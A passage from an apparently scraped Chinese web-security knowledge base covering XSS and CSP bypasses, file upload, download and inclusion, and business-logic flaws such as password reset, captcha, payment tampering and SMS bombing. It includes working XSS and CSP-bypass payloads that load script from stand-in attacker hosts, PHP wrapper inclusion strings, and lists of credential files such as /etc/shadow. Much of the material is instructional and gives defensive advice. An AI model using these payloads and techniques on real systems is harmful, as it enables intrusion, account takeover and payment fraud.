href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x31;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x36;#x33;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x35;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x32;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x34;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a 四、CSP绕过1.jsonp绕过要求： CSP：script-src self https://www.google.com https://www.youtube.com; object-src none; 2.绕过 CSP 默认源要求： CSP 类似Content-Security-Policy: default-src self unsafe-inline;， 有效载荷： http://example.lab/csp.php?xss=f=document.createElement%28iframe%29;f.id=pwn;f.src=/robots.txt;f.onload=%28%29=%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29; script=document.createElement(script);script.src=//remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 3.绕过 CSP 在线评估(iframe被禁止)要求： CSP或 CSPinline或eval 有效载荷： ddocument;fd.createElement(“iframe”);f.srcd.querySelector(‘link[href*”.css”]’).href;d.body.append(f);sd.createElement(“script”);s.src”https:[YOUR_XSSHUNTER_USERNAME].xss.ht”;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) 4.绕过 CSP 脚本源自身要求： 类似 CSPscript-src self 有效载荷： 5.绕过 CSP 脚本源数据要求： CSP 就像Mozillascript-src self data:官方文档中警告的那样。 有效载荷： / 更新: 2025-10-30 14:36:37原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/77e032031005277f075285e5e89854b2"},{"path":"/wiki/Web知识点/xss/绕过CSP默认源.html","content":"绕过 CSP 默认源🔍 攻击原理详解✅ CSP 设置分析default-src self unsafe-inline; self：只允许加载同源资源。 unsafe-inline：允许内联脚本（如 alert(1)）。 ❌ 不允许从外部域名加载脚本（如 //remoteattacker.lab/csp.js）。 ✅ 攻击思路：利用 iframe 的“同源”特性虽然主页面不能加载外部脚本，但： iframe 加载的是同源页面（如 /robots.txt，只要是同源的就行）。 iframe 的内容属于同源，因此可以操作其 DOM。 向 iframe 中注入 ，相当于在同源环境中加载外部脚本，从而绕过 CSP 限制。 ✅ 攻击代码逐步解释第一步：创建 iframe 并加载同源页面JavaScript 复制 f = document.createElement(iframe);f.id = pwn;f.src = /robots.txt; // 只要是同源的就行document.body.appendChild(f); 第二步：iframe 加载完成后，向其中注入外部脚本JavaScript 复制 f.onload = () = x = document.createElement(script); x.src = //remoteattacker.lab/csp.js; // 外部恶意脚本 pwn.contentWindow.document.body.appendChild(x); // 注入到 iframe 中; ✅ 简化版代码（你提供的第二段）JavaScript 复制 script = document.createElement(script);script.src = //remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 这段代码假设页面上已经有一个 iframe（比如前面注入的）。 它直接向 iframe 的 DOM 中插入外部脚本，绕过主页面 CSP。 ⚠️ 关键点总结表格 复制 限制 绕过方式 主页面不能加载外部脚本 不直接加载，而是注入到 同源的 iframe 中 iframe 也受 CSP 限制？ ✅ 但 iframe 的 DOM 可以被主页面操作，只要同源 外部脚本加载成功？ ✅ 因为 iframe 中插入的脚本不受主页面 CSP 限制（它是独立文档） ✅ 防御建议 限制 iframe 使用： 使用 frame-ancestors none 防止被嵌套。 或使用 sandbox 属性限制 iframe 权限。 细化 CSP： 不要使用 default-src self 这么宽松。 明确指定 script-src self 禁止外部脚本。 禁止 unsafe-inline 或使用 nonce/hash 机制。 防止 iframe 被滥用： 对页面中动态创建的 iframe 进行监控或限制。 设置 X-Frame-Options: DENY 或 SAMEORIGIN。 更新: 2025-10-30 12:09:34原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/mnqgka24pvso2uzf"},{"path":"/wiki/Web知识点/文件上传/文件上传.html","content":"文件上传文件上传 http:目标网站include.php?fileuploadmerged.gif 文件头对照表： 类型 魔数（Hex） ASCII 表现 GIF 47 49 46 38 GIF89a JPEG FF D8 ÿØ PNG 89 50 4E 47 ‰PNG 更新: 2025-09-06 13:59:50原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/b51bb3acf2c9c6b5d5e07bbb55ec634b"},{"path":"/wiki/Web知识点/文件下载/文件下载.html","content":"文件下载 检测参数值后接上是否为文件或文件链接read.xxx?filenamedown.xxx?filenamereadfile.xxx?filedownfile.xxx?file.. ..\\ . .等%00 ? %23 %20 .等readpath、filepath、path、inputpath、url、data、readfile、menu、META-INF、WEB-INF、 更新: 2025-09-06 13:59:51原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/d8ef6c5d0f9ac6e0343fc8028e3f62b3"},{"path":"/wiki/Web知识点/逻辑越权/越权.html","content":"越权逻辑越权 水平垂直 垂直越权:添加用户 前提条件:获取的添加用户的数据包怎么来的数据包: 1.普通用户前端有操作界面可以抓取数据包 2.通过网站源码本地搭建自己去模拟抓取 3.盲猜 逻辑漏洞简介逻辑漏洞就是指攻击者利用业务功能上的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或代码问题或固有不足。操作上并不影响程序运行，在逻辑上是顺利执行的。 这种漏洞一般的防护手段或设备无法阻止，因为走的都是合法流量。也没有防护标准。 逻辑漏洞分类越权漏洞 密码修改 密码找回 验证码****漏洞 支付漏洞 短信****轰炸 投票积分抽奖 逻辑漏洞重要性常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来；并且传统的安全防御设备和措施收效甚微； 但逻辑漏洞属于和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则通过脚本扫描，因此逻辑漏洞大多需要配合代码审计和手动测试才可发现相关漏洞，也是工具无法完全替代人所作的一类漏洞； 越权漏洞概念越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第二名。 该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。 其中越权访问分为： 水平越权 垂直越权 分类水平越权：相同级别（权限）的用户或者同一角色中不同的用户之间，可以越权访问、修改或者删除其他用户信息的非法操作。如果出现此漏洞，可能会造成大批量数据的 泄露，严重的甚至会造成用户信息被恶意篡改。 **水平越权：**指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问 垂直越权 ：就是不同级别之间的用户或不同角色之间用户的越权，比如普通用户可以执行管理员才能执行的功能。 垂直越权：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。 产生原因水平越权和垂直越权的定义不一样，但漏洞原理是一样的，都是账户体系上在判断权限时不严格导致存在绕过漏洞，这一类的绕过通常发生在cookie验证不严、简单判断用户提交的参数，归根结底，都是因为这些参数是在客户端提交，服务端未严格校验。 1.通过隐藏URL 实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。 2.直接对象引用 这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。 3.多阶段功能 多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。 当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改密码。 4.静态文件 很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。 5.平台配置错误 一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。 修复建议1、前后端同时对用户输入信息进行校验，双重验证机制 2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限 3、特别敏感操作可以让用户再次输入密码或其他的验证信息。 4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。 或在 session、cookie 中加入不可预测、不可猜解的 user 信息。 5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理 6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤 密码重置漏洞概念什么是密码重置？ 顾名思义，就是修改掉原来的密码；密码重置的途径有哪些？ 1、一个网站，一般我们可以登录进入个人中心，直接修改密码； 2、当我们忘记密码是还可以使用系统自带的密码找回功能进行密码修改； 什么是密码重置漏洞？ 密码重置这个功能本身没有问题，但如过对密码重置功能的验证机制不够完善就形成了漏洞； 成因一、基于修改密码的 如果后台没有对旧密码进行验证，就直接让输入新密码 1、第一种方式，如果存在CSRF漏洞，我们就可以利用一波; 2、如果存在越权漏洞，就可以直接修改其他人的密码; 3、点击修改后抓包测试，观察数据库包有没有验证类似cookie随机数，如果没有的话，可以尝试修改用户名、手机号或者uid来尝试重置其他密码; 如果后台是通过向注册手机或者注册邮箱来重置密码的，关于验证码的漏洞我们都可以尝试，这种方式的前提是你已经通过某种方式进入到了对方的个人中心，所以意义不太大. 二、基于找回密码的 一般情况下当我们点击找回密码的时候都是通过验证手机号或者验证邮箱，这就又变成了验 证码的问题; \\1.验证码发送后前端返回 \\2. 未限制验证码次数导致验证码爆破 \\3. 验证码有规律或可控 \\4. 验证码被放在返回包中 \\5. 输入验证码后通过修改响应包的状态来重置密码 \\6. 验证码为空（原理就是后台未考虑验证码为空的情况，直接就是如果存在，然后下面仅 判断了存在的情况）绕过或者万能验证码 \\7. 拦截数据包，发送验证码时可以向多个手机号发送验证码，这个时候就可以添加个云短信，直接接受验证码完成修改等等 密码找回漏洞密码找回是出现逻辑漏洞问题最多的一个功能，因为它的交互流程最多，目前找回密码的方式比较常见的有邮箱验证码、手机验证码以及密保问题， 1.输入用户名邮箱收机阶段 交互过程：即输入要重置的账号信息，点击确定时，大部分应用会直接从数据库中读取用户邮箱和手机信息，并且发送验证码，还有部分程序在输入用户名后，会提示使用手机还是邮箱找回密码。 在提交的时候可以直接抓包修改手机或者邮箱参数，这时如果后端没有做验证，原本发送给账号A的验证码就会发送到被我们篡改的手机或者邮箱上，利用接收到的验证码即可重置密码。 2.填写验证码和新密码阶段 填写验证码和新密码就意味着我们已经拿到了验证码或者重置密码的URL，这里存在的 主要问题有： （1）验证凭证较简单，可以暴力破解。 目前大多数手机短信重置密码的验证码都是4位或者6位数字，如果提交验证码的地方没有对这个验证码进行错误次数限制，则会存在可以爆破的问题，这是目前最常见的一种找回密码漏洞利用方式。 （2）验证凭证算法简单，凭证可预测。 部分网站找回密码的Token是根据当前用户的“用户名+邮箱”或者时间戳进行一次MD5后生成，这就存在一定得预测性，利用自己写的算法去碰撞即可拿到争取到的重置密码凭证。 （3）验证凭证直接保存在源码里。 目前这种比较少，不过也存在一定比例，一种是在点击发送验证码的时候就可以直接在源码里看到给当前用手机或者邮箱发送过去的验证码，还有一种是在输入验证码的时候， 源码里面就直接保存了正确的验证码。 3.发送新密码阶段 凭证未绑定用户：我们在找回密码的时候，发送到邮箱的链接通常是如下这个样子：http://www.xxx.com/user.php?m=repwduid=用户IDkey凭证密钥email邮箱 当请求这个链接的时候，后端程序根据uid和key对应上了从而判断这个找回密码的链接是否有效，但是在将新密码提交到服务器的时候，服务器端并没有判断当前这个key是否跟uid或者email匹配，而是直接修改掉了uid或者email指定的用户密码，这样我们只要拦截修改密码的请求包，将里面的用户参数修改成我们要篡改密码的用户账号即可。 修复建议1.接收验证码的邮箱和手机号不可由用户控制，应该直接从数据库中读取出来。 2.加强验证凭证复杂度，防止被暴力破解。 3.限制验证凭证错误次数，单个用户在半个小时内验证码错误三次，半小时内禁止找回密码。 4.验证凭证设置失效时间。 5.验证凭证不要保存在页面。 6.输入用户邮箱或ID、手机号取验证凭证的地方需要设置验证码防止短信炸弹和批量找回等。 7.验证凭证跟用户名、用户ID、用户邮箱绑定，找回密码时验证当前凭证是否是当前用户的。 验证码漏洞漏洞概念：验证码机制主要用于用户身份识别，常见可分为图片验证码、数字验证码、滑动验证码、短信验证码、邮箱验证码等； 漏洞成因：服务端未对验证时间、次数作出限制，存在爆破的可能性。验证码常用在批量注册，任意用户登录场景。 漏洞分类：1、前端验证绕过 原理：前端验证码绕过一般是前端JavaScript脚本生成验证码，验证的工作在前端进行； 思路：直接删除相对应的部份的代码即可，要求能够大概看懂前端的代码； 2、后端验证码未刷新 原理：后端绕过情况1：后端代码在逻辑上存在问题，验证失败时，验证码不过期，可以继续做认证（也算作逻辑漏洞）； 思路：这类情况需要Burp抓包测试验证； 实战：东塔攻防世界-后端验证码绕过 3、TOKEN验证可提取 思路：利用burp工具，可以每次自动提取后台返回的token值，用于下一次的爆破使用； 支付漏洞原理支付漏洞，是一种很简单的逻辑漏洞，通过抓包简单修改数据包即可实现。 世界上的公司分为俩种，一种是还没被黑客攻击过的，另一种就是已经被 黑客 攻击过的。 所以企业也越来越重视网络安全这块，这样的支付漏洞就那么好找了……. 商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知； Ø 浏览器跳转 基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性； Ø 服务器端异步通知 该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等； 分类1.修改支付价格 支付三步曲——订购、下单、付款 •三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。 2.修改订单数量 很简单，就是本来一笔订单5块钱，可以尝试把订单修改为负数 3.修改附属值(优惠券) 优惠劵主要用来打折或者抵扣现金，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么 问题就会产生，直接支付成功。 4.越权支付 例如：usernameXXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品； 5.无限制试用 在支付的时候它URL后面的支付接口是3，而试用接口是4，那么此时你已经使用过了，复制下确认试用时的URL，修改后面的支付接口为3，那么此时就会调用购买支付接口，但是由于你本身这个产品就是试用的，其相应值绑定了这个试用商品，那么金额就肯定是0，那么最后点击支付，你就可以看到支付成功，试用成功，又重复试用了一次，然后他们的试用时间会累加在一起，这就导致了可无限制购买任何产品了。 6.修改支付接口 一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接口值不一样，如果逻辑设计不当，当我随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果没做好不存在接口相关处理，那么此时就会支付成功； 7.多重替换 首先去产生两个订单，这两个订单商品是不一样的，其价格不一样，如果服务端没有做好这相关的验证，那么在支付的过程当中抓包，修改其订单值为另一个订单值，最后支付，这时就可以用订单一的支付价格买到订单而的商品； 防御Ø 后端检查每一项值，包括支付状态； Ø 校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量； Ø 与第三方支付平台检查，实际支付的金额是否与订单金额一致； Ø 支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题； Ø 金额超过阈值，进行人工审核 ； 投票积分抽奖漏洞投票和抽奖以及积分在很多促销活动或者推广手段上都经常用到，背后的奖品成本可能上数十万，如果这些奖品被恶意用户刷走了，不仅推广的效果没有，而且浪费了成本投入。 不管是投票、积分还是抽奖，都存在一个公共点：即单个用户次数存在限制，比如一场活动中一个用户只能抽奖一次。这样的限制也会存在很多绕过方式。 利用方法1.cookie和POST请求正文绕过 有的应用将验证是否抽奖或者领取积分的判断值放置在cookie或者POST的请求正文里，服务器端获取到这个结果后判断是否还有机会抽奖，而这个数据我们是可以直接在数据包中修改的，所以就会产生绕过，比如cookie中isok1代表已经抽奖，isok0代表还没有抽奖， 而我们只要再点击抽奖，然后把isok的值改为0即可一直抽奖。 2.基于IP验证 做的比较弱的统计是直接基于IP验证，像访问量、推广获取积分等，这类要看程序获取IP的方式，如果是client-ip或者x_forword_for获取IP，则可以直接伪造IP绕过。 3.基于用户认证 也有一部分应用需要登陆以后才能抽奖或者投票，这类可以结合看看能不能批量注册，如果可以，则可以用程序实现批量登陆刷票，或者投票的时候POST包或者cookie里面的当前uid\\ 用户名等是否可以随意修改绕过用户单次限制。 防御方法从上面利用手段可以看到主要的三个点是IP、登录用户和cookie、分析出可用性较高的防御 手段如下： Ø 机器识别码验证，每台机器都可以根据硬件信息生成唯一的识别码。 Ø 操作需要登陆，当前用户信息从session中读取。 更新: 2025-09-06 14:00:00原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/c0432b2085137abddc58b26bc82adb75"},{"path":"/wiki/Web知识点/文件包含/文件包含.html","content":"文件包含文件包含 函数include conn.php: 当包含文件出现错误时，发出错误信息，继续执行 include_once conn.php：只包含一次 require conn.php： 当包含出现错误时，发出错误信息，不再执行 require_once conn.php：只包含一次 本地包含本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。文件包含漏洞还包含当前服务器中的其他文件，同时支持包含Web应用程序的目录，尝试包括你的硬盘的一些内容，例如：C:\\WINDOWS\\system.ini。 php伪协议php://php://input+post数据php://filter/read=convert.base64-encode/resource=index.phpdata://text/plain,?php%20phpinfo();? 远程包含.allow_url_fopen On allow_url_include On 可以在服务器上制作以恶搞恶意文件，通过http或https进行上传，即可达到远程控制 常见的敏感信息路径：Windows系统 c:\\boot.ini 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml IIS配置文件 c:\\windows\\repair\\sam 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD MySQL root密码 c:\\windows\\php.ini php 配置信息 LinuxUnix系统 etcpasswd 账户信息 etcshadow 账户密码文件 usrlocalappapache2confhttpd.conf Apache2默认配置文件 usrlocalappapache2confextrahttpd-vhost.conf 虚拟网站配置 usrlocalappphp5libphp.ini PHP相关配置 etchttpdconfhttpd.conf Apache配置文件 etcmy.conf mysql 配置文件 更新: 2025-09-06 13:59:52原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/391438681c100be7b8a63626059f3812"},{"path":"/wiki/Web知识点/逻辑越权/挖掘流程.html","content":"挖掘流程逻辑漏洞挖掘逻辑漏洞#逻辑漏洞是指由于程序逻辑输入管控不严或者逻辑太复杂，导致程序不能够正常处理或处理错误，逻辑漏洞根据功能需求的不同产生的漏洞方式也不同。一般出现在网站程序的登录注册、密码找回、验证方式、信息查看、交易支付金额等地方。 这类漏洞不同于常见WEB漏洞，常见WEB漏洞都可以总结为一定的范式，而逻辑漏洞不行 逻辑漏洞出现的原因也是有很多种，需要有一定个人经验积累才能在代码审计过程中发现此类漏洞 挖掘思路#首先将所有逻辑漏洞的问题分为前端和后端两个部分，先测试绕过前端规则限制再测试绕过后端规则限制，一般情况下只要能够突破原有规则限制的都就可以算是漏洞。 挖掘逻辑漏洞总体步骤分为以下三步： 明确业务逻辑流程，根据业务需求的特点，有针对性的进行测试。 寻找流程中可以被操控的环节，分析可被操控环节中可能产生的逻辑问题。 珠宝修改参数触发逻辑问题，重放包对比结果差异。 业务逻辑漏洞#- 登录模块# 暴力破解 任意用户密码登陆 短信邮箱轰炸 验证码绕过爆破重放回传 用户名手机号枚举 越权登陆（例如修改数据包中用户ID） 账号权限绕过（越权） Cookie伪造 用户空密码登陆 注册模块# 前端验证绕过 用户任意批量注册 恶意验证注册账户 账户重复注册 用户名绑定手机号枚举 注册信息插入XSS 短信邮箱轰炸 验证码绕过爆破重放回传 其他验证机制绕过 密码找回# 任意批量用户密码重置 任意邮箱手机号验证（验证码与绑定用户未统一验证） 用户绑定手机号枚举 新密码劫持 短信验证码劫持绕过回传爆破重放 用户邮箱劫持篡改 其他验证机制绕过 购买支付充值# 商品金额数量篡改 替换支付模块 交易信息泄露 虚假充值金额 充值账户金额数量篡改 支付验证绕过 整数溢出，int最大值为2147483647 修改本地JS或服务端返回的数据包中的关键值 个人资料# 手机号用户邮箱枚举 修改个人资料插入XSS 邮箱用户手机号篡改 用户信息遍历泄露 越权修改他人账户资料 抽奖活动# 任意抽奖 盗刷奖品积分 抽奖积分次数篡改 并发抽奖 邀请码XSS（验证码URL可能包含用户名，可将用户名修改为XSS代码） 代金券优惠券# 批量刷取代金券优惠券 更改代金券金额数量 更改优惠券数量 并发逻辑漏洞（burp批量获取优惠劵等） 订单# 订单信息遍历泄露 订单信息泄露导致用户信息泄露 越权修改删除他人订单 账户# 账户验证绕过 账户金额篡改 账户绑定手机号绕过 账户第三方账户绑定绕过 会员系统# 用户越权操作访问 个人资料信息遍历泄露 修改个人信息头像上传任意文件 如果遇到xlsxdocx，可能存在XXE，上传恶意文档盲测 修改个人信息页面插入XSS 传输过程# POSTCookie注入 cookie劫持 修改信息处无sessiontoken导致CSRF 明文传输账号密码 评论模块# POST注入 无sessiontoken导致CSRF 评论时插入XSS 遍历用户ID导致用户信息泄露 恶意批量刷评论数量 第三方系统# 第三方系统未授权访问 第三方账户信息遍历 第三方账户越权访问 第三方账户信息泄露 第三方应用版本漏洞 验证码安全# 验证码参数删除绕过 验证码生成规律预测 验证码图像内容可被工具识别 验证码长期不失效，进行爆破 验证码回显到页面或者数据包中 单个验证码可多次重复利用 短信验证码与手机号未统一验证 短信验证码未对单个手机号发送次数进行限制 短信验证码未做发送时间限制，导致短信轰炸 可能存在万能验证码 接口调用# 未授权访问敏感数据接口 短信api接口泄露被恶意调用 数据库接口泄露，导致数据可被恶意操作 逻辑漏洞利用#验证码#万能验证码： 程序员在开发验证码模块时，为了方便调用验证码验证功能是否完善，故意设置了几个万能的验证码作为测试数据。在开发结束后由于程序员的疏忽，没有删除该测试验证码数据从而导致该漏洞的产生。 验证码回传： 通过抓包的方式，可以看到验证码内容回显在了数据包中；或者通过查看网页源代码可以看到验证码中的内容，导致正确验证码可以被直接读取利用到。 删除验证码绕过： 通过抓包将验证码的值删除或者直接删除验证码参数，然后将修改后的数据包进行重放导致验证码验证被绕过。 验证码爆破： 此处验证码爆破通常是指手机短信验证的方式，由于没有对输入同一个验证码的次数做限制，并且验证码的内容太简单，例如4位或者6位的纯数字组成。可以通过Burp的Intruder模块对验证码内容进行爆破，直到匹配到正确的验证码。 验证码重放 首先，输入错误的验证码，进行抓包重放一次，观察验证的返回的数据包内容，再用正确的验证码再进行抓包重放，对比两个数据包的差异，然后根据这些差异验证码是否失效。 然后将正确的验证码发送至Burp的Intruder模进行不断的重放，比较这些数据包是否都是正确验证码时返回的一样内容，如果数据包内容一样说明存在验证码重放的漏洞。 验证码与手机号未统一匹配 首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。 短信轰炸#尝试不断重放发送验证码的数据包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间次数限制。 如果后端对短信验证码做了限制，那么可以尝试以下几种方式进行绕过： 删除修改cookie或者返回值，重放数据包 遍历参数发送数据包 对参数进行叠加 手机号后面加空格(%20)或者前面加其他的比如+86、逗号、分号、字母等 请求参数修改大小写，或者添加请求参数id1 多接口测试，可能登陆位置做了防护，但密码找回出没有防护 利用调用接口绕过短信轰炸限制 修改IP绕过短信轰炸限制 添加重复的手机号参数，重放数据包 越权操作#首先用一个账号登陆系统后，通过抓包修改用户参数，可以达到查看或者修改他人账号的目的，尽量对多接口或者多功能模块进行不断测试越权操作。同时也要多个账号登陆，分析对比这些账号数据包中的请求参数差异，通过修改这些存在差异的参数，看看是否能够达到越权操作的目的。 越权漏洞又分为平行越权，垂直越权和交叉越权。 平行越权：权限类型不变，权限ID改变 垂直越权：权限ID不变，权限类型改变 交叉越权：即改变ID，也改变权限 用户信息泄露#可能存在用户个人信息页面、密码找回处以及各种调用到用户信息数据的地方，通过抓包查看返回信息是否加载了一些敏感的数据信息，比如查询用户信息的时候也将用户的密码数据在数据包中回显了；或者在用户个人资料页面，通过抓包修改用户ID参数，可以通过遍历查询到其他账号的用户资料，导致用户信息泄露； 任意用户密码重置#通常发生在忘记密码处，由于系统没有严格匹配用户忘记密码时的验证方式，通过抓包修改用户参数，导致任意用户的密码都能够被重置。 比如某个忘记密码功能处采用手机号短信验证的方式来重置用户密码，如果该验证手机号没有对用户账户进行绑定，那么就可以通过输入任意手机号接收短信验证，然后就可以利用该验证码重置用户密码了。 订单金额任意修改#很多中小型的购物网站都存在订单金额任意修改漏洞。在提交订单的时候抓取数据包或者直接修改前端代码，然后对订单的金额任意修改。 经常见到的参数大多为：rmb 、value 、amount 、cash 、fee 、money 等 关于支付的逻辑漏洞这一块还有很多种思路，比如相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数等等。 未授权访问#有些业务的接口，因为缺少了对用户的登陆凭证的较验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。 一般容易出现在文件导出下载，JSON数据页面，第三方应用页面等位置。 常见案例： 某电商后台主页面，直接在管理员web路径后面输入main.php之类的即可进入。 某航空公司订单ID枚举 某电子认证中心敏感文件下载 某站越权操作及缺陷，其主要原因是没对ID参数做cookie验证导致 实际上还有很多案例，他们都存在一个共同的特性，就是没有对用户的登陆凭证进行效验 接口无限制枚举#有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击。 常见案例： 某电商登陆接口无验证导致撞库 某招聘网验证码无限制枚举 某快递公司优惠券枚举 某电商会员卡卡号枚举 某超市注册用户信息获取 cookietoken设计存在缺陷#cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举。或者通过修改cookie中的某个参数可以登陆其他用户，即cookie仿冒。 token一般是操作令牌，每个用户在登录系统时，服务器会为每个用户生成token令牌作为操作凭证。如果token设计太过于简单，那么可能会被破解；或者token没有设置过期的时间，使得用户token不唯一，导致用户token存在被盗用的风险。 找回密码存在设计缺陷#auth设计缺陷 经常研究逻辑漏洞的人可能会对以下URL很熟悉 www.xxx.com/resetpassword.php?id=MD5 用户修改密码时，邮箱中会收到一个含有auth的链接，在有效期内用户点击链接，即可进入重置密码环节。而大部分网站对于auth的生成都是采用rand()函数，那么这里就存在一个问题了，Windows环境下rand()最大值为32768，所以这个auth的值是可以被枚举的。 如下面这个代码可以对auth的值做一个字典。 $a=0;for ($a=0;$a=32768;$a++) $b=md5($a); echo \\r ; echo $b; 然后重置某个账号，并且对重置链接内的auth进行枚举。 签约漏洞# 使用A手机登陆账号A打开要测试的业务，点击自动续费，支付时停留在支付界面。 使用B手机登陆账号A打开要测试的业务，点击自动续费，支付时停留在支付界面。 重复多台手机进行同样操作 A手机点击支付进行签约 A手机支付成功后，在第三方APP中解除自动续费 B手机进行支付，支付成功后在第三方APP中解除自动续费 全部支付完成后，系统就会为你开通相应的次数，由于提前打开了支付界面，所以金额都是享受到新用户首月优惠的金额。 最终的效果是，一个账户享受到了多次新用户首月优惠金额，即证明漏洞的存在。 通常这种漏洞比较容易出现在活动页面的会员优惠开通，而且要考虑到支付后要比正常购买优惠才算是漏洞。 会员升级# 使用A手机登陆账号A，并且开通会员。开通超级会员，进入到升级页面，进行补齐差价开通。 使用B手机登陆账号A，点击开通超级会员，进入到升级页面，进行补齐差价开通。 A手机进行支付，B手机进行支付。服务器认为你补齐了多个月份的超级会员，然后到账多次。 其实这个和签约漏洞的原理差不多，绕过了支付后服务器才去校验是否可以升级的逻辑。 订单关闭# 使用优惠券创建一个订单，停留在支付界面 关闭订单，返回优惠券 使用优惠券再次创建订单；把第一个未支付的订单进行支付 商品从关闭，重新进入到了代发货的阶段，优惠券却仍然存在，即证明漏洞存在 支付金额# 有些业务在支付时会忽略分以后的单位，这时候就导致了存在分单位的金额也可以生成订单 比如0.0190.02，在支付时客户端给服务器传了0.019元的订单。而第三方付支通常最小的单位为分 